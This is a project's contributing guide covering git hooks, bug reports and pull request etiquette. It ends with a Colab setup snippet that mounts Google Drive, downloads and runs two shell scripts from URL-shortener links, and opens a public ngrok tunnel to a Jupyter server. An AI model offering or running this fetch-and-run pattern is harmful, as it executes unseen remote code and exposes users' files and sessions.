# How to contribute

## How to get started

Before anything else, please install the git hooks that run automatic scripts during each commit and merge to strip the notebooks of superfluous metadata (and avoid merge conflicts). After cloning the repository, run the following command inside it:
```
nbdev_install_git_hooks
```

## Did you find a bug?

* Ensure the bug was not already reported by searching on GitHub under Issues.
* If you're unable to find an open issue addressing the problem, open a new one. Be sure to include a title and clear description, as much relevant information as possible, and a code sample or an executable test case demonstrating the expected behavior that is not occurring.
* Be sure to add the complete error messages.

#### Did you write a patch that fixes a bug?

* Open a new GitHub pull request with the patch.
* Ensure that your PR includes a test that fails without your patch, and pass with it.
* Ensure the PR description clearly describes the problem and solution. Include the relevant issue number if applicable.

## PR submission guidelines

* Keep each PR focused. While it's more convenient, do not combine several unrelated fixes together. Create as many branches as needing to keep each PR focused.
* Do not mix style changes/fixes with "functional" changes. It's very difficult to review such PRs and it most likely get rejected.
* Do not add/remove vertical whitespace. Preserve the original style of the file you edit as much as you can.
* Do not turn an already submitted PR into your development playground. If after you submitted PR, you discovered that more work is needed - close the PR, do the required work and then submit a new PR. Otherwise each of your commits requires attention from maintainers of the project.
* If, however, you submitted a PR and received a request for changes, you should proceed with commits inside that PR, so that the maintainer can see the incremental fixes and won't need to review the whole PR again. In the exception case where you realize it'll take many many commits to complete the requests, then it's probably best to close the PR, do the work and then submit it again. Use common sense where you'd choose one way over another.

## Do you want to contribute to the documentation?

* Docs are automatically created from the notebooks in the nbs folder.

## Note for COLAB users
The best experience for colab users will be gotten using Juyter Notebooks on colab. This can be simply set up by doing
```
from google.colab import drive
drive.mount('/content/drive')

import subprocess
def run_inf_loop():
    while True: ...
    
def setup_colab(tok):
  subprocess.call(['wget', 'http://tiny.cc/80jwlz', '-O', 'bash.sh'])
  subprocess.call(['sh', 'bash.sh'])
  get_ipython().system_raw(f'./ngrok authtoken {tok} && ./ngrok http --log=stdout 8888 > ngrok.log &')
  !pip install nbdev -q
  !curl -s http://localhost:4040/api/tunnels | python3 -c "import sys, json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])"
  subprocess.call(['wget', 'http://tiny.cc/qrjwlz', '-O', 'bash2.sh'])
  subprocess.call(['sh', 'bash2.sh'])
  run_inf_loop()
  
setup_colab(<ngrok_auth_token>)
```

After this open up the link that is shown and then you can start working in a Jupyter Notebook using a Google Colab backend!
